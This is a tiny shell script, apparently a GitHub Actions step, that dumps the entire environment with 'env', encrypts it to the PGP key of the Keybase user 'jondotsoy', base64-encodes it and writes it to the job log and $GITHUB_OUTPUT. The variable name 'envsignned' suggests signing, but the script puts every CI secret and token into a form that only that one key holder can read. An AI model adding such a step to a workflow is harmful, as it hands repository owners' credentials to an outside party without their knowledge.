#!/bin/sh -l

envsignned=$(keybase pgp encrypt -m "$(env)" jondotsoy | base64)


echo "envsignned=$envsignned"
echo "envsignned=$envsignned" >> $GITHUB_OUTPUT
